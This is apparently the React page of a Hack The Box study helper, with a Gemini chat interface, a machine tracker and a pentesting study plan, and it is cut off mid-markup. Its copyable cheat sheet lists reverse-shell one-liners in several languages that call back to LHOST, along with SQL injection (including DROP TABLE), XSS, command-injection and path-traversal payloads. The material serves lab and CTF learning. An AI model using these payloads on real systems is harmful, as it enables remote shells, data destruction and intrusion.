"use client";

import type { ReactNode } from "react";
import { Fragment, useEffect, useState } from "react";

type ChatMessage = {
  role: "user" | "assistant";
  content: string;
};

type HTBMachine = {
  id: string;
  name: string;
  ip: string;
  ports: string;
  services: string;
  creds: string;
  userFlag: string;
  rootFlag: string;
  notes: string;
};

function CopyableInline({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(text);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      setCopied(false);
    }
  };
  return (
    <code
      role="button"
      tabIndex={0}
      onClick={copy}
      onKeyDown={(e) => e.key === "Enter" && copy()}
      className={`cursor-pointer rounded px-1 py-0.5 font-mono text-xs transition ${
        copied ? "bg-htb-accent text-htb-primary htb-glow" : "bg-htb-surface border border-htb-border hover:border-htb-accent"
      }`}
      title={copied ? "Copied!" : "Click to copy"}
    >
      {text}
    </code>
  );
}

function CopyableCodeBlock({ code, blockKey }: { code: string; blockKey: number }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(code.trim());
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      setCopied(false);
    }
  };
  return (
    <div key={blockKey} className="group relative my-3">
      <pre className="overflow-x-auto rounded-md border border-htb-border bg-htb-surface px-3 py-2 pr-12 text-xs text-htb-text">
        <code className="whitespace-pre">{code}</code>
      </pre>
      <button
        type="button"
        onClick={copy}
        className={`absolute right-2 top-2 rounded px-2 py-1 text-xs font-medium transition ${
          copied ? "bg-htb-accent text-htb-primary" : "text-htb-secondary hover:bg-htb-surface hover:text-htb-accent border border-htb-border"
        }`}
        title="Copy"
      >
        {copied ? "Copied!" : "Copy"}
      </button>
    </div>
  );
}

/** Formats raw AI text for clean, readable display. Preserves code blocks; adds structure for headings, lists, and paragraphs. */
function formatAiMessage(content: string): ReactNode {
  if (!content || !content.trim()) return content;

  const elements: ReactNode[] = [];
  const codeBlockRegex = /```[\s\S]*?```/g;
  let lastIndex = 0;
  let match: RegExpExecArray | null;

  while ((match = codeBlockRegex.exec(content)) !== null) {
    if (match.index > lastIndex) {
      elements.push(
        <Fragment key={`text-before-${match.index}`}>
          {parseTextBlocks(content.slice(lastIndex, match.index))}
        </Fragment>
      );
    }
    const codeRaw = match[0];
    const langMatch = codeRaw.match(/^```(\w*)\n?/);
    const codeContent = langMatch ? codeRaw.slice(langMatch[0].length, -3) : codeRaw.slice(3, -3);
    elements.push(
      <CopyableCodeBlock key={match.index} blockKey={match.index} code={codeContent} />
    );
    lastIndex = match.index + match[0].length;
  }
  if (lastIndex < content.length) {
    elements.push(
      <Fragment key="text-tail">
        {parseTextBlocks(content.slice(lastIndex))}
      </Fragment>
    );
  }

  return <div className="space-y-2 whitespace-pre-wrap break-words">{elements}</div>;
}

function parseTextBlocks(text: string): ReactNode {
  const lines = text.split(/\n/);
  const blocks: ReactNode[] = [];
  let i = 0;

  while (i < lines.length) {
    const line = lines[i];
    const trimmed = line.trim();

    if (trimmed.startsWith("## ")) {
      blocks.push(
        <h2 key={`h2-${i}`} className="mt-4 text-base font-semibold text-htb-text first:mt-0 uppercase tracking-wide">
          {renderWithCopyableCode(trimmed.slice(3), `h2-${i}`)}
        </h2>
      );
      i++;
      continue;
    }
    if (trimmed.startsWith("### ")) {
      blocks.push(
        <h3 key={`h3-${i}`} className="mt-3 text-sm font-semibold text-htb-text uppercase tracking-wide">
          {renderWithCopyableCode(trimmed.slice(4), `h3-${i}`)}
        </h3>
      );
      i++;
      continue;
    }
    if (/^[-•*]\s/.test(trimmed) || /^\d+\.\s/.test(trimmed)) {
      const listStart = i;
      const listItems: string[] = [];
      while (i < lines.length) {
        const ln = lines[i];
        const t = ln.trim();
        if (/^[-•*]\s/.test(t) || /^\d+\.\s/.test(t)) {
          listItems.push(t.replace(/^[-•*]\s/, "").replace(/^\d+\.\s/, ""));
          i++;
        } else if (/^\s{2,}/.test(ln) && listItems.length > 0) {
          listItems[listItems.length - 1] += "\n" + ln.trim();
          i++;
        } else if (!t) {
          i++;
          break;
        } else {
          break;
        }
      }
      blocks.push(
        <ul key={`ul-${listStart}`} className="list-inside list-disc space-y-1 pl-2 text-htb-secondary">
          {listItems.map((item, j) => (
            <li key={j}>{renderWithCopyableCode(item, `li-${listStart}-${j}`)}</li>
          ))}
        </ul>
      );
      continue;
    }
    if (trimmed) {
      const paraLines: string[] = [trimmed];
      i++;
      while (i < lines.length && lines[i].trim() && !lines[i].trim().startsWith("#") && !/^[-•*]\s/.test(lines[i].trim()) && !/^\d+\.\s/.test(lines[i].trim())) {
        paraLines.push(lines[i].trim());
        i++;
      }
      blocks.push(
        <div key={`p-${i}`} className="space-y-1">
          {paraLines.map((line, k) => (
            <p key={k} className="leading-relaxed text-htb-secondary">
              {renderWithCopyableCode(line, `p-${i}-${k}`)}
            </p>
          ))}
        </div>
      );
      continue;
    }
    i++;
  }

  return <>{blocks}</>;
}

function renderWithCopyableCode(text: string, keyPrefix: string): ReactNode {
  const parts: ReactNode[] = [];
  const regex = /`([^`]+)`/g;
  let lastIndex = 0;
  let match: RegExpExecArray | null;
  let i = 0;
  while ((match = regex.exec(text)) !== null) {
    if (match.index > lastIndex) {
      parts.push(text.slice(lastIndex, match.index));
    }
    parts.push(<CopyableInline key={`${keyPrefix}-${i++}`} text={match[1]} />);
    lastIndex = match.index + match[0].length;
  }
  if (lastIndex < text.length) parts.push(text.slice(lastIndex));
  return parts.length === 1 ? parts[0] : <>{parts}</>;
}

const CHEAT_SHEET: { title: string; items: { label: string; payload: string }[] }[] = [
  {
    title: "Reverse Shells",
    items: [
      { label: "Bash", payload: "bash -i >& /dev/tcp/LHOST/LPORT 0>&1" },
      { label: "Python", payload: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'" },
      { label: "nc -e", payload: "nc -e /bin/sh LHOST LPORT" },
      { label: "nc mkfifo", payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f" },
      { label: "PHP", payload: "php -r '$sock=fsockopen(\"LHOST\",LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
      { label: "Perl", payload: "perl -e 'use Socket;$i=\"LHOST\";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'" },
      { label: "Ruby", payload: "ruby -rsocket -e 'f=TCPSocket.open(\"LHOST\",LPORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'" },
    ],
  },
  {
    title: "SQLi",
    items: [
      { label: "Auth bypass", payload: "' OR '1'='1' --" },
      { label: "Union columns", payload: "' UNION SELECT NULL,NULL,NULL--" },
      { label: "Union all", payload: "' UNION ALL SELECT 1,2,3,4,5--" },
      { label: "Time-based", payload: "'; WAITFOR DELAY '0:0:5'--" },
      { label: "MySQL comment", payload: "' OR 1=1#" },
      { label: "Stacked", payload: "'; DROP TABLE users--" },
    ],
  },
  {
    title: "XSS",
    items: [
      { label: "Basic", payload: "<script>alert(1)</script>" },
      { label: "Img onerror", payload: "<img src=x onerror=alert(1)>" },
      { label: "Svg", payload: "<svg onload=alert(1)>" },
      { label: "Event handler", payload: "<body onload=alert(1)>" },
      { label: "Polyglot", payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e" },
    ],
  },
  {
    title: "Command Injection",
    items: [
      { label: "Semicolon", payload: "; id" },
      { label: "Pipe", payload: "| id" },
      { label: "And", payload: "&& id" },
      { label: "Newline", payload: "%0aid" },
      { label: "Backtick", payload: "`id`" },
      { label: "$()", payload: "$(id)" },
    ],
  },
  {
    title: "LFI / Path Traversal",
    items: [
      { label: "Basic", payload: "../../../etc/passwd" },
      { label: "Null byte", payload: "../../../etc/passwd%00" },
      { label: "Double encode", payload: "..%252f..%252f..%252fetc/passwd" },
      { label: "PHP filter", payload: "php://filter/convert.base64-encode/resource=index.php" },
      { label: "PHP input", payload: "php://input" },
    ],
  },
  {
    title: "Misc",
    items: [
      { label: "Base64 decode", payload: "echo BASE64 | base64 -d" },
      { label: "URL decode", payload: "echo % encoded | sed 's/%/\\\\x/g' | xargs -I{} printf {}" },
      { label: "Common ports", payload: "21:FTP 22:SSH 23:Telnet 25:SMTP 80:HTTP 443:HTTPS 445:SMB 3306:MySQL 5432:Postgres" },
    ],
  },
];

function CheatSheetPanel() {
  const [openCategory, setOpenCategory] = useState<string | null>("Reverse Shells");
  return (
    <section className="rounded-lg border border-htb-border bg-htb-surface p-4 text-sm text-htb-secondary">
      <h2 className="text-sm font-semibold uppercase tracking-wide text-htb-text">
        Cheat Sheet
      </h2>
      <p className="mt-1 text-xs text-htb-secondary">
        Common payloads — click to copy. Replace LHOST/LPORT in shells.
      </p>
      <div className="mt-3 flex max-h-[320px] flex-col gap-1 overflow-y-auto pr-1">
        {CHEAT_SHEET.map((cat) => (
          <div key={cat.title} className="rounded border border-htb-border">
            <button
              type="button"
              onClick={() => setOpenCategory((c) => (c === cat.title ? null : cat.title))}
              className="flex w-full items-center justify-between px-2 py-1.5 text-left text-xs font-semibold uppercase text-htb-text hover:bg-htb-primary hover:text-htb-accent transition"
            >
              {cat.title}
              <span className="text-htb-secondary">{openCategory === cat.title ? "−" : "+"}</span>
            </button>
            {openCategory === cat.title && (
              <div className="space-y-1 border-t border-htb-border px-2 py-1.5">
                {cat.items.map((item) => (
                  <CheatSheetItem key={item.label} label={item.label} payload={item.payload} />
                ))}
              </div>
            )}
          </div>
        ))}
      </div>
    </section>
  );
}

function CheatSheetItem({ label, payload }: { label: string; payload: string }) {
  const [copied, setCopied] = useState(false);
  const copy = async () => {
    try {
      await navigator.clipboard.writeText(payload);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    } catch {
      setCopied(false);
    }
  };
  return (
    <div className="group flex items-center gap-2 rounded px-1.5 py-1 hover:bg-htb-primary transition">
      <span className="shrink-0 text-[10px] font-medium uppercase text-htb-secondary w-14">{label}</span>
      <code
        className="min-w-0 flex-1 truncate font-mono text-[10px] text-htb-text"
        title={payload}
      >
        {payload}
      </code>
      <button
        type="button"
        onClick={copy}
        className={`shrink-0 rounded px-1.5 py-0.5 text-[10px] font-medium transition ${
          copied ? "bg-htb-accent text-htb-primary htb-glow" : "border border-htb-border text-htb-secondary hover:border-htb-accent hover:text-htb-accent"
        }`}
      >
        {copied ? "✓" : "Copy"}
      </button>
    </div>
  );
}

function MachineTrackerForm({ onAdd }: { onAdd: (ip: string, name: string) => void }) {
  const [ip, setIp] = useState("");
  const [name, setName] = useState("");
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = ip.trim();
    if (!trimmed) return;
    onAdd(trimmed, name);
    setIp("");
    setName("");
  };
  return (
    <form onSubmit={handleSubmit} className="mt-3 flex flex-wrap gap-2">
      <input
        value={ip}
        onChange={(e) => setIp(e.target.value)}
        placeholder="IP (e.g. 10.10.10.5)"
        className="w-28 rounded-md border border-htb-border bg-htb-primary px-2 py-1.5 text-xs text-htb-text placeholder-htb-secondary focus:outline-none focus:ring-2 focus:ring-htb-accent focus:border-htb-accent"
      />
      <input
        value={name}
        onChange={(e) => setName(e.target.value)}
        placeholder="Name (optional)"
        className="w-24 rounded-md border border-htb-border bg-htb-primary px-2 py-1.5 text-xs text-htb-text placeholder-htb-secondary focus:outline-none focus:ring-2 focus:ring-htb-accent focus:border-htb-accent"
      />
      <button
        type="submit"
        className="rounded-md border border-htb-accent bg-htb-accent px-3 py-1.5 text-xs font-semibold text-htb-primary transition htb-btn-accent"
      >
        Add
      </button>
    </form>
  );
}

function MachineCard({
  machine,
  isExpanded,
  onToggle,
  onUpdate,
  onDelete,
  onSetContext,
  onCopyFlag,
}: {
  machine: HTBMachine;
  isExpanded: boolean;
  onToggle: () => void;
  onUpdate: (updates: Partial<HTBMachine>) => void;
  onDelete: () => void;
  onSetContext: () => void;
  onCopyFlag: (value: string) => void;
}) {
  const label = machine.name || machine.ip;
  return (
    <div className="rounded-md border border-htb-border">
      <button
        type="button"
        onClick={onToggle}
        className="flex w-full items-center justify-between px-3 py-2 text-left text-xs font-medium text-htb-text hover:bg-htb-primary hover:text-htb-accent transition"
      >
        <span className="truncate">{label}</span>
        <span className="shrink-0 text-htb-secondary">{isExpanded ? "−" : "+"}</span>
      </button>
      {isExpanded && (
        <div className="space-y-2 border-t border-htb-border px-3 py-2">
          <EditableRow label="IP" value={machine.ip} onChange={(v) => onUpdate({ ip: v })} />
          <EditableRow label="Name" value={machine.name} onChange={(v) => onUpdate({ name: v })} placeholder="optional" />
          <EditableRow label="Ports" value={machine.ports} onChange={(v) => onUpdate({ ports: v })} placeholder="22, 80, 443" />
          <EditableRow label="Services" value={machine.services} onChange={(v) => onUpdate({ services: v })} placeholder="SSH, Apache" />
          <EditableRow label="Creds" value={machine.creds} onChange={(v) => onUpdate({ creds: v })} placeholder="user:pass" />
          <FlagRow label="User flag" value={machine.userFlag} onChange={(v) => onUpdate({ userFlag: v })} onCopy={onCopyFlag} />
          <FlagRow label="Root flag" value={machine.rootFlag} onChange={(v) => onUpdate({ rootFlag: v })} onCopy={onCopyFlag} />
          <EditableRow label="Notes" value={machine.notes} onChange={(v) => onUpdate({ notes: v })} placeholder="findings, next steps" />
          <div className="flex flex-wrap gap-2 pt-1">
            <button
              type="button"
              onClick={onSetContext}
              className="rounded border border-htb-accent px-2 py-1 text-xs font-semibold text-htb-accent transition hover:bg-htb-accent hover:text-htb-primary"
            >
              Set as context
            </button>
            <button
              type="button"
              onClick={onDelete}
              className="rounded border border-htb-secondary px-2 py-1 text-xs text-htb-secondary transition hover:border-htb-accent hover:text-htb-accent"
            >
              Delete
            </button>
          </div>
        </div>
      )}
    </div>
  );
}

function EditableRow({
  label,
  value,
  onChange,
  placeholder,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  placeholder?: string;
}) {
  return (
    <div>
      <div className="text-[10px] font-semibold uppercase text-htb-secondary">{label}</div>
      <input
        value={value}
        onChange={(e) => onChange(e.target.value)}
        placeholder={placeholder}
        className="mt-0.5 w-full rounded border border-htb-border bg-htb-primary px-2 py-1 text-xs text-htb-text placeholder-htb-secondary focus:outline-none focus:ring-1 focus:ring-htb-accent focus:border-htb-accent"
      />
    </div>
  );
}

function FlagRow({
  label,
  value,
  onChange,
  onCopy,
}: {
  label: string;
  value: string;
  onChange: (v: string) => void;
  onCopy: (v: string) => void;
}) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    if (value.trim()) {
      onCopy(value);
      setCopied(true);
      setTimeout(() => setCopied(false), 1500);
    }
  };
  return (
    <div>
      <div className="text-[10px] font-semibold uppercase text-htb-secondary">{label}</div>
      <div className="mt-0.5 flex gap-1">
        <input
          value={value}
          onChange={(e) => onChange(e.target.value)}
          placeholder="HTB{...}"
          className="flex-1 rounded border border-htb-border bg-htb-primary px-2 py-1 text-xs font-mono text-htb-text placeholder-htb-secondary focus:outline-none focus:ring-1 focus:ring-htb-accent focus:border-htb-accent"
        />
        <button
          type="button"
          onClick={handleCopy}
          disabled={!value.trim()}
          title="Copy flag"
          className={`shrink-0 rounded px-2 py-1 text-xs font-medium transition disabled:opacity-40 ${
            copied ? "bg-htb-accent text-htb-primary htb-glow" : "border border-htb-border text-htb-secondary hover:border-htb-accent hover:text-htb-accent"
          }`}
        >
          {copied ? "✓" : "Copy"}
        </button>
      </div>
    </div>
  );
}

export default function Home() {
  const [messages, setMessages] = useState<ChatMessage[]>([]);
  const [input, setInput] = useState("");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [errorHint, setErrorHint] = useState<string | null>(null);
  const [model, setModel] = useState("gemini-2.5-flash");
  const [weekIndex, setWeekIndex] = useState(1);
  const [dayIndex, setDayIndex] = useState(1);
  const [notes, setNotes] = useState("");
  const [streamEnabled, setStreamEnabled] = useState(true);
  const [sessionContext, setSessionContext] = useState("");
  const [machines, setMachines] = useState<HTBMachine[]>([]);
  const [expandedMachineId, setExpandedMachineId] = useState<string | null>(null);

  useEffect(() => {
    const savedModel = window.localStorage.getItem("gemini_model");
    const savedSessionContext = window.localStorage.getItem("htb_session_context");
    const savedMachines = window.localStorage.getItem("htb_machines");
    const savedWeek = window.localStorage.getItem("study_week");
    const savedDay = window.localStorage.getItem("study_day");
    const savedNotes = window.localStorage.getItem("study_notes");
    const savedStream = window.localStorage.getItem("stream_enabled");

    if (savedModel) {
      const m = savedModel.trim();
      const deprecated = ["gemini-2.0-flash", "gemini-1.5-flash"];
      if (deprecated.includes(m)) {
        window.localStorage.setItem("gemini_model", "gemini-2.5-flash");
        setModel("gemini-2.5-flash");
      } else {
        setModel(m);
      }
    }

    if (savedWeek) {
      const parsed = Number(savedWeek);
      if (!Number.isNaN(parsed)) {
        setWeekIndex(parsed);
      }
    }

    if (savedDay) {
      const parsed = Number(savedDay);
      if (!Number.isNaN(parsed)) {
        setDayIndex(parsed);
      }
    }

    if (savedNotes) {
      setNotes(savedNotes);
    }

    if (savedStream) {
      setStreamEnabled(savedStream === "true");
    }
    if (savedSessionContext) {
      setSessionContext(savedSessionContext);
    }
    if (savedMachines) {
      try {
        const parsed = JSON.parse(savedMachines) as HTBMachine[];
        if (Array.isArray(parsed)) {
          setMachines(parsed);
        }
      } catch {
        // ignore invalid JSON
      }
    }
  }, []);

  useEffect(() => {
    window.localStorage.setItem("htb_session_context", sessionContext);
  }, [sessionContext]);

  useEffect(() => {
    window.localStorage.setItem("gemini_model", model.trim());
  }, [model]);

  useEffect(() => {
    window.localStorage.setItem("study_week", String(weekIndex));
  }, [weekIndex]);

  useEffect(() => {
    window.localStorage.setItem("study_day", String(dayIndex));
  }, [dayIndex]);

  useEffect(() => {
    window.localStorage.setItem("study_notes", notes);
  }, [notes]);

  useEffect(() => {
    window.localStorage.setItem("stream_enabled", String(streamEnabled));
  }, [streamEnabled]);

  useEffect(() => {
    window.localStorage.setItem("htb_machines", JSON.stringify(machines));
  }, [machines]);

  const machineToContext = (m: HTBMachine) => {
    const lines: string[] = [];
    lines.push(`Machine: ${m.ip}${m.name ? ` (${m.name})` : ""}`);
    if (m.ports.trim()) lines.push(`Ports: ${m.ports.trim()}`);
    if (m.services.trim()) lines.push(`Services: ${m.services.trim()}`);
    if (m.creds.trim()) lines.push(`Creds: ${m.creds.trim()}`);
    if (m.userFlag.trim()) lines.push(`User flag: ${m.userFlag.trim()}`);
    if (m.rootFlag.trim()) lines.push(`Root flag: ${m.rootFlag.trim()}`);
    if (m.notes.trim()) lines.push(`Notes: ${m.notes.trim()}`);
    return lines.join("\n");
  };

  const copyFlag = async (value: string) => {
    if (!value.trim()) return;
    try {
      await navigator.clipboard.writeText(value.trim());
    } catch {
      setError("Copy failed.");
    }
  };

  const addMachine = (ip: string, name = "") => {
    const m: HTBMachine = {
      id: crypto.randomUUID(),
      name: name.trim(),
      ip: ip.trim(),
      ports: "",
      services: "",
      creds: "",
      userFlag: "",
      rootFlag: "",
      notes: "",
    };
    setMachines((prev) => [m, ...prev]);
    setExpandedMachineId(m.id);
  };

  const updateMachine = (id: string, updates: Partial<HTBMachine>) => {
    setMachines((prev) =>
      prev.map((m) => (m.id === id ? { ...m, ...updates } : m))
    );
  };

  const deleteMachine = (id: string) => {
    setMachines((prev) => prev.filter((m) => m.id !== id));
    if (expandedMachineId === id) setExpandedMachineId(null);
  };

  const dailySession = [
    {
      title: "5 min",
      detail: "Review yesterday's notes or key terms.",
    },
    {
      title: "15 min",
      detail: "New concept explained in beginner-friendly steps.",
    },
    {
      title: "8 min",
      detail: "Hands-on lab or guided walkthrough.",
    },
    {
      title: "2 min",
      detail: "Write a 3-bullet recap and next question.",
    },
  ];

  const studyPlan = [
    {
      week: 1,
      focus: "Foundations + Linux",
      days: [
        "What pentesting is + CIA triad",
        "Linux terminal basics (pwd, ls, cd)",
        "Files & permissions (chmod, chown)",
        "Processes + basic networking",
        "Review + mini quiz",
        "OverTheWire Bandit (0-3)",
        "TryHackMe: Linux Fundamentals 1",
      ],
      labs: ["OverTheWire Bandit", "TryHackMe Linux Fundamentals"],
    },
    {
      week: 2,
      focus: "Networking Basics",
      days: [
        "IPs, ports, TCP/UDP",
        "DNS + HTTP overview",
        "ping / traceroute / nslookup",
        "curl and reading headers",
        "Review + mini quiz",
        "TryHackMe: Network Fundamentals",
        "PicoCTF networking intro",
      ],
      labs: ["TryHackMe Network Fundamentals", "PicoCTF"],
    },
    {
      week: 3,
      focus: "Web Basics + OWASP Top 10",
      days: [
        "How web requests work",
        "Cookies, sessions, auth",
        "OWASP Top 10 overview",
        "XSS concept",
        "SQLi concept",
        "PortSwigger: XSS intro",
        "PortSwigger: SQLi intro",
      ],
      labs: ["PortSwigger Web Security Academy"],
    },
    {
      week: 4,
      focus: "Web Practice",
      days: [
        "CSRF + IDOR concepts",
        "File upload risks",
        "Input validation basics",
        "Auth weaknesses",
        "Review + mini quiz",
        "OWASP Juice Shop (beginner tasks)",
        "DVWA (low difficulty)",
      ],
      labs: ["OWASP Juice Shop", "DVWA"],
    },
    {
      week: 5,
      focus: "Recon & Enumeration (Lab-only)",
      days: [
        "Recon concepts",
        "Enumeration concepts",
        "Service discovery theory",
        "Reading CVEs",
        "Review + mini quiz",
        "TryHackMe: Pre Security",
        "HTB Academy: Getting Started",
      ],
      labs: ["TryHackMe", "Hack The Box Academy"],
    },
    {
      week: 6,
      focus: "Exploitation Basics",
      days: [
        "Vuln → exploit → impact",
        "Common vuln patterns",
        "Mitigation mindset",
        "Reporting basics",
        "Review + mini quiz",
        "Metasploitable2 (local VM)",
        "VulnHub beginner box",
      ],
      labs: ["Metasploitable2", "VulnHub"],
    },
    {
      week: 7,
      focus: "Reporting & Documentation",
      days: [
        "How to write findings",
        "Severity & impact",
        "Remediation write-ups",
        "OWASP Top 10 mapping",
        "Review + mini quiz",
        "Report: Juice Shop",
        "Report: DVWA",
      ],
      labs: ["Write reports from labs"],
    },
    {
      week: 8,
      focus: "Consolidation + CTF Practice",
      days: [
        "Review weak spots",
        "Review weak spots",
        "Review weak spots",
        "Review weak spots",
        "Review weak spots",
        "PicoCTF beginner set",
        "TryHackMe Complete Beginner",
      ],
      labs: ["PicoCTF", "TryHackMe"],
    },
  ];

  const quickPrompts = [
    "How do I start an HTB machine? What's the methodology?",
    "Explain enumeration for a Linux box (nmap, services, dirs).",
    "Common web vulnerabilities I should check on HTB.",
    "What's the difference between Active and Retired machines?",
    "Give me hints for privilege escalation on Linux.",
  ];

  const sendMessage = async () => {
    const trimmed = input.trim();
    if (!trimmed || isLoading) return;

    const nextMessages: ChatMessage[] = [...messages, { role: "user", content: trimmed }];
    if (streamEnabled) {
      setMessages([...nextMessages, { role: "assistant", content: "" }]);
    } else {
      setMessages(nextMessages);
    }
    setInput("");
    setIsLoading(true);
    setError(null);
    setErrorHint(null);

    try {
      const response = await fetch("/api/chat", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          messages: nextMessages,
          model: model.trim(),
          stream: streamEnabled,
          sessionContext: sessionContext.trim() || undefined,
        }),
      });

      if (!response.ok) {
        const text = await response.text();
        let errMessage = text;
        try {
          const errJson = JSON.parse(text) as { error?: string };
          if (typeof errJson.error === "string") errMessage = errJson.error;
        } catch {
          // keep text as-is
        }
        throw new Error(errMessage);
      }

      if (streamEnabled) {
        const reader = response.body?.getReader();
        if (!reader) {
          throw new Error("Streaming response unavailable");
        }

        const decoder = new TextDecoder();
        let buffer = "";
        let assistantContent = "";

        while (true) {
          const { value, done } = await reader.read();
          if (done) break;
          buffer += decoder.decode(value, { stream: true });

          const lines = buffer.split("\n");
          buffer = lines.pop() ?? "";

          for (const line of lines) {
            const trimmedLine = line.trim();
            if (!trimmedLine) continue;
            try {
              const chunk = JSON.parse(trimmedLine) as {
                message?: { content?: string };
                response?: string;
                done?: boolean;
              };
              const content =
                chunk.message?.content ??
                (typeof chunk.response === "string" ? chunk.response : "");
              if (content) {
                assistantContent += content;
              }
              if (chunk.done) break;
            } catch {
              continue;
            }
          }
        }

        setMessages((prev) => {
          const updated = [...prev];
          const last = updated[updated.length - 1];
          if (last?.role === "assistant") {
            updated[updated.length - 1] = { ...last, content: assistantContent };
          } else {
            updated.push({ role: "assistant", content: assistantContent });
          }
          return updated;
        });
      } else {
        const data = (await response.json()) as { message?: string };
        const reply = data.message?.trim() || "(No response)";
        setMessages([...nextMessages, { role: "assistant", content: reply }]);
      }
    } catch (err) {
      const message = err instanceof Error ? err.message : "Request failed";
      setError(message);
      const lower = message.toLowerCase();
      if (lower.includes("gemini_api_key") || lower.includes("not configured")) {
        setErrorHint("Add GEMINI_API_KEY to .env.local. Get a key at aistudio.google.com/apikey");
      } else if (lower.includes("rate limit") || lower.includes("quota") || lower.includes("429")) {
        setErrorHint("Free tier limit reached. Wait a few minutes, or try gemini-2.5-flash-lite. Check usage at aistudio.google.com");
      } else if (lower.includes("aborted")) {
        setErrorHint("The request took too long (timeout). Try again.");
      } else {
        setErrorHint(null);
      }
    } finally {
      setIsLoading(false);
    }
  };

  const getTodayPlan = () => {
    const currentWeek = studyPlan.find((item) => item.week === weekIndex);
    if (!currentWeek) {
      return {
        week: weekIndex,
        day: dayIndex,
        focus: "Unknown",
        topic: "Plan not found",
        labs: [],
      };
    }

    const topic = currentWeek.days[dayIndex - 1] ?? currentWeek.days[0];
    return {
      week: currentWeek.week,
      day: dayIndex,
      focus: currentWeek.focus,
      topic,
      labs: currentWeek.labs,
    };
  };

  const generateTodaysPrompt = () => {
    const today = getTodayPlan();
    setInput(
      `Today's session: Week ${today.week}, Day ${today.day} (${today.focus}). Topic: ${today.topic}. Please teach this in a 30-minute beginner lesson with a quick lab and recap.`
    );
  };

  const advanceProgress = () => {
    if (dayIndex < 7) {
      setDayIndex(dayIndex + 1);
      return;
    }

    if (weekIndex < 8) {
      setWeekIndex(weekIndex + 1);
      setDayIndex(1);
      return;
    }
  };

  const resetProgress = () => {
    setWeekIndex(1);
    setDayIndex(1);
  };

  const copyNotes = async () => {
    try {
      await navigator.clipboard.writeText(notes);
    } catch {
      setError("Copy failed. Select the notes and copy manually.");
    }
  };

  const downloadNotes = () => {
    const blob = new Blob([notes], { type: "text/plain" });
    const link = document.createElement("a");
    link.href = URL.createObjectURL(blob);
    link.download = "study-notes.txt";
    link.click();
    URL.revokeObjectURL(link.href);
  };

  return (
    <div
      className="flex min-h-screen items-center justify-center bg-htb-primary font-sans"
      style={{
        backgroundImage: "url(/icon.png)",
        backgroundRepeat: "no-repeat",
        backgroundPosition: "center top",
        backgroundSize: "420px",
      }}
    >
      {/* Fixed bottom bar – Copilot-style chat input, always visible */}
      <div className="fixed bottom-0 left-0 right-0 z-[9999] flex h-14 w-full items-center border-t border-htb-border bg-htb-surface px-4">
        <div className="mx-auto flex w-full max-w-3xl items-center gap-3">
          <input
            value={input}
            onChange={(event) => setInput(event.target.value)}
            onKeyDown={(event) => {
              if (event.key === "Enter" && !event.shiftKey) {
                event.preventDefault();
                sendMessage();
              }
            }}
            placeholder="Ask about Hack The Box — machines, challenges, tools, methodology..."
            className="flex-1 rounded-lg border border-htb-border bg-htb-primary px-4 py-2.5 text-sm text-htb-text focus:border-htb-accent focus:outline-none focus:ring-1 focus:ring-htb-accent"
          />
          <button
            type="button"
            onClick={sendMessage}
            disabled={isLoading}
            className="shrink-0 rounded-lg bg-htb-accent px-5 py-2.5 text-sm font-semibold text-htb-primary transition htb-btn-accent disabled:cursor-not-allowed disabled:opacity-50"
          >
            {isLoading ? "Thinking..." : "Send"}
          </button>
        </div>
      </div>

      <main className="flex min-h-screen w-full max-w-6xl flex-col gap-6 px-6 pb-24 pt-6">
        <header className="flex flex-col gap-2">
          <div className="flex items-center gap-3">
            <img
              src="/icon.png"
              alt="HTB Helper logo"
              className="h-10 w-10 rounded-xl"
            />
            <h1 className="text-3xl font-bold uppercase tracking-tight text-htb-accent htb-glow-text">
              HTB Challenge Helper
            </h1>
          </div>
          <p className="text-sm text-htb-secondary">
            Ask anything about Hack The Box — machines, challenges, tools, and methodology.
          </p>
        </header>

        <div className="grid gap-6 lg:grid-cols-[2fr_1fr]">
          <section className="flex min-h-[520px] flex-1 flex-col gap-4 rounded-lg border border-htb-border bg-htb-surface p-4">
            <div className="flex flex-1 flex-col gap-3 overflow-y-auto">
              {messages.length === 0 ? (
                <div className="text-sm text-htb-secondary">
                  Ask anything about Hack The Box — machines, challenges, tools, or methodology.
                </div>
              ) : (
                messages.map((message, index) => (
                  <div
                    key={`${message.role}-${index}`}
                    className={`rounded-md px-3 py-2 text-sm ${
                      message.role === "user"
                        ? "self-end bg-htb-accent text-htb-primary"
                        : "self-start bg-htb-primary border border-htb-border text-htb-text"
                    }`}
                  >
                    {message.role === "assistant"
                      ? formatAiMessage(message.content)
                      : message.content}
                  </div>
                ))
              )}
            </div>

            <div className="flex flex-wrap gap-2">
              {quickPrompts.map((prompt) => (
                <button
                  key={prompt}
                  type="button"
                  onClick={() => setInput(prompt)}
                  className="rounded-full border border-htb-border px-3 py-1 text-xs text-htb-secondary transition hover:border-htb-accent hover:text-htb-accent"
                >
                  {prompt}
                </button>
              ))}
            </div>

            {error && (
